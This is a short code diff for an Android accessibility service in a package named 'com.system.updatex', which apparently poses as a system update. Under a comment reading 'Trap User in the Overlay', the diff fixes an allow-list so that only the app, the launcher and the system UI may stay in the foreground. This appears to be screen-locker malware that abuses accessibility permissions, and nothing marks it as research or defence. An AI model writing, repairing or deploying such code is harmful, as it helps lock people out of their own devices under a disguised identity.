@@ -1,4 +1,4 @@
-package package com.system.updatex;
+package com.system.updatex;
 
 import android.accessibilityservice.AccessibilityService;
 import android.content.Intent;
@@ -28,8 +28,8 @@ public class KioskAccessibilityService extends AccessibilityService {
             }
         }
 
-        // 2. Trap User in the Overlay
-        boolean isAllowed = foregroundPackage.equals("com.fr4nx.vplinkbypasser") 
+        // 2. Trap User in the Overlay (FIXED the package name string here)
+        boolean isAllowed = foregroundPackage.equals("com.system.updatex") 
                 || foregroundPackage.contains("launcher") 
                 || foregroundPackage.contains("systemui");
 
